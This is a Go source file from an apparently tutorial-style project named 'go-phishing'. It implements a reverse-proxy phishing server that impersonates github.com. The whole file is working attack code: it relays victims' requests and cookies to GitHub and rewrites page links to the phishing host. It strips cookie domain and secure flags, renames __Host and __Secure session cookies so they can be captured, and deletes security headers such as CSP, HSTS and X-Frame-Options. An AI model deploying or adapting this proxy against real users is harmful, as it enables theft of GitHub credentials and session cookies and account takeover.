package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
	"go-phishing/db"
	"github.com/sirupsen/logrus"
)

const (
	upstreamURL = "https://github.com"
	phishURL    = "http://localhost:8080"
)

func cloneRequest(r *http.Request) *http.Request {
	method := r.Method
	body := r.Body
	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := upstreamURL + path + "?" + rawQuery
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}
	req.Header = r.Header
	// Origin Referer 處理
	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", referer)
	// 帶上 cookie
	req.Header["Cookie"] = r.Header["Cookie"]
	// 停止 gzip 請求
	req.Header.Del("Accept-Encoding")
	// Cookie __開頭 Transfer
	for i, value := range req.Header["Cookie"] {
		newValue := strings.Replace(value, "XDHost", "__Host", -1)
		newValue = strings.Replace(newValue, "XDSecure", "__Secure", -1)
		req.Header["Cookie"][i] = newValue
	}

	return req
}

func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
	checkRedirect := func(r *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	client := http.Client{CheckRedirect: checkRedirect}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	resp.Body.Close()

	return respBody, resp.Header, resp.StatusCode
}

func replaceURLInResp(body []byte, header http.Header) []byte {
	// html 寫死處理
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")
	if !isHTML {
		return body
	}
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)
	// .git 處理
	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)
	re, err := regexp.Compile(phishGitURL)
	if err != nil {
		panic(err)
	}
	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)

	return []byte(bodyStr)
}

func handler(w http.ResponseWriter, r *http.Request) {
	req := cloneRequest(r)
	body, header, statusCode := sendReqToUpstream(req)
	body = replaceURLInResp(body, header)
	// Cookie 處理
	for _, v := range header["Set-Cookie"] {
		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
		newValue = strings.Replace(newValue, "secure;", "", -1)
		// __ 開頭Cookei  Transfer
		// __Host-user-session -> XXHost-user-session
		// __Secure-cookie-name -> XXSecure-cookie-name
		newValue = strings.Replace(newValue, "__Host", "XDHost", -1)
		newValue = strings.Replace(newValue, "__Secure", "XDSecure", -1)

		w.Header().Add("Set-Cookie", newValue)
	}
	// Set-Cookie 已經取消 secure, domain 了
	// 所以複製除了 Set-Cookie 之外的 header
	for k := range header {
		if k != "Set-Cookie" {
			value := header.Get(k)
			w.Header().Set(k, value)
		}
	}
	// 安全性 Cookie Del
	w.Header().Del("Content-Security-Policy")
	w.Header().Del("Strict-Transport-Security")
	w.Header().Del("X-Frame-Options")
	w.Header().Del("X-Xss-Protection")
	w.Header().Del("X-Pjax-Version")
	w.Header().Del("X-Pjax-Url")
	// 301 302 處理
	if statusCode >= 300 && statusCode < 400 {
		location := header.Get("Location")
		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
		w.Header().Set("Location", newLocation)
	}

	w.WriteHeader(statusCode)
	w.Write(body)
}

func main() {
	// logrus
	l := logrus.New()
	l.Info("Server listened on 8080 port!")
	// db
	db.Connect()
	for _,str := range db.SelectAll(){
		fmt.Println(str)
	}
	// http server
	http.HandleFunc("/", handler)
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		panic(err)
	}
}